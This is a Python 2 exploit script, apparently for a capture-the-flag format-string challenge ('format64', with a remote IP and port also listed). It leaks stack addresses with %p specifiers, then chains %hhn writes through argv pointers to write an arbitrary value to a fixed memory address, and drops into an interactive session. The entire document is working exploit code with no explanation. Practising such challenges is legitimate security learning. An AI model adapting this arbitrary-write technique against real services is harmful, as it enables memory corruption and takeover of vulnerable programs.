from zio import *

target = ('119.254.101.197', 10000)
target = './format64'


def do_fmt(io, fmt):
    io.writeline(fmt)


def exp(target):
    # io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'), print_write=COLORED(REPR, 'green'))
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))

    io.writeline('%11$p')
    argv0 = int(io.readline().strip('\n'), 16)
    io.writeline('%37$p')
    path = int(io.readline().strip('\n'), 16)
    print hex(path)

    path = (path + 8) / 8 * 8
    print hex(path)

    index3 = (path - argv0) / 8 + 37

    # not need
    io.writeline('%37$s')
    print HEX(io.readline().strip('\n'))

    # not need
    io.writeline('%%%d$p' % index3)
    io.readline()

    io.gdb_hint()

    addr = 0x0000000000601040
    value = 0x414243444546
    for i in range(8):
        do_fmt(io, '%%%dc%%11$hhn' % ((path + i) & 0xff))

        k = ((addr >> (i * 8)) & 0xff)
        if k != 0:
            do_fmt(io, '%%%dc%%37$hhn' % k)
        else:
            do_fmt(io, '%37$hhn')

    do_fmt(io, '%%%dc%%11$hhn' % (path & 0xff))

    io.gdb_hint()

    for i in range(8):
        do_fmt(io, '%%%dc%%37$hhn' % ((addr + i) & 0xff))
        k = ((value >> (i * 8)) & 0xff)
        if k != 0:
            do_fmt(io, '%%%dc%%%d$hhn' % (k, index3))
        else:
            do_fmt(io, '%%%d$hhn' % (index3))

    io.gdb_hint()

    io.interact()


exp(target)
